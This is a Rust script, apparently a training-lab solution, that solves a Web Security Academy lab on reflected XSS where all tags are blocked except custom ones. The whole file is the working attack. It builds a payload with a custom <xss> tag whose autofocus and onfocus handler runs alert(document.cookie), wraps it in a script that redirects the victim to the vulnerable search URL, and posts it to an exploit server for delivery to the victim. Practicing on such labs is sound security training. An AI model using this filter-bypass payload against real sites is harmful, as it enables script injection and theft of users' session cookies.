/*******************************************************************************************
*
* Author: Ahmed Elqalaawy (@elqal3awii)
*
* Date: 22/11/2023
*
* Lab: Reflected XSS into HTML context with all tags blocked except custom ones
*
* Steps: 1. Craft a script that will redirect the victim to the vulnerable website with 
*           the injected payload in the search query parameter
*        2. Deliver the exploit to the victim
*        3. The alert() function will be called after they trigger the exploit
*
********************************************************************************************/
#![allow(unused)]
/***********
* Imports
***********/
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    header::HeaderMap,
    redirect::Policy,
};
use std::{
    collections::HashMap,
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

/******************
* Main Function
*******************/
fn main() {
    // change this to your lab URL
    let lab_url = "https://0a660022042b90c683c6f61d00470077.web-security-academy.net";

    // change this to your exploit server URL
    let exploit_server_url = "https://exploit-0aae00470419901f837bf54701ad0001.exploit-server.net";

    // build the client that will be used for all subsequent requests
    let client = build_client();

    // the header of your exploit sever response
    let exploit_server_head = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8";

    // payload to call the alert() function
    let payload = format!(
        r###"<script>
                location = "{lab_url}/?search=<xss autofocus tabindex=1 onfocus=alert(document.cookie)></xss>"
            </script>"###
    );

    print!("{}", "❯❯ Delivering the exploit to the victim.. ".white(),);
    io::stdout().flush();

    // deliver the exploit to the victim
    client
        .post(exploit_server_url)
        .form(&HashMap::from([
            ("formAction", "DELIVER_TO_VICTIM"),
            ("urlIsHttps", "on"),
            ("responseFile", "/exploit"),
            ("responseHead", exploit_server_head),
            ("responseBody", &payload),
        ]))
        .send()
        .expect(&format!(
            "{}",
            "[!] Failed to deliver the exploit to the victim".red()
        ));

    println!("{}", "OK".green());
    println!(
        "{}",
        "🗹 The alert() function will be called after they trigger the exploit".white()
    );
    println!(
        "{} {}",
        "🗹 The lab should be marked now as".white(),
        "solved".green()
    )
}

/*******************************************************************
* Function used to build the client
* Return a client that will be used in all subsequent requests
********************************************************************/
fn build_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::default())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}
